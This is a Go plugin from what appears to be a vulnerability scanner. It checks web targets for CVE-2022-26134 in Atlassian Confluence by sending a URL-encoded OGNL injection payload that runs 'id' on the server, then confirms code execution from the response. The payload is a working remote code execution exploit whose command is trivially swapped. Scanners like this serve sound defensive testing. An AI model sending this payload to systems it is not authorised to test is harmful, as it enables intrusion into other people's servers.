package plugins

import (
	"DORM/models"
	"fmt"
	"io"
	"strings"
)

// 79. ATLASSIAN CONFLUENCE RCE (V2 - PRO: OUTPUT VERIFICATION)
type ConfluencePlugin struct{}

func (p *ConfluencePlugin) Name() string { return "Atlassian Confluence RCE (CVE-2022-26134)" }

func (p *ConfluencePlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	payload := "/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/"

	resp, err := models.GetClient().Get(getURL(target, payload))
	if err == nil {
		defer resp.Body.Close()

		headerVal := resp.Header.Get("X-Cmd-Response")
		bodyBytes, _ := io.ReadAll(resp.Body)
		bodyString := string(bodyBytes)

		isVulnerable := false
		proof := ""

		if headerVal != "" {
			isVulnerable = true
			proof = "Header: " + headerVal
		} else if strings.Contains(bodyString, "uid=") && strings.Contains(bodyString, "gid=") {
			isVulnerable = true
			proof = "Body contains 'uid=' pattern."
		}

		if isVulnerable {
			return &models.Vulnerability{
				Target:      target,
				Name:        "Atlassian Confluence RCE",
				Severity:    "CRITICAL",
				CVSS:        9.8,
				Description: fmt.Sprintf("Unauthenticated Remote Code Execution confirmed.\nPayload: OGNL Injection\nProof: %s", proof),
				Solution:    "Patch Confluence Server/Data Center to the latest version immediately.",
				Reference:   "CVE-2022-26134",
			}
		}
	}
	return nil
}
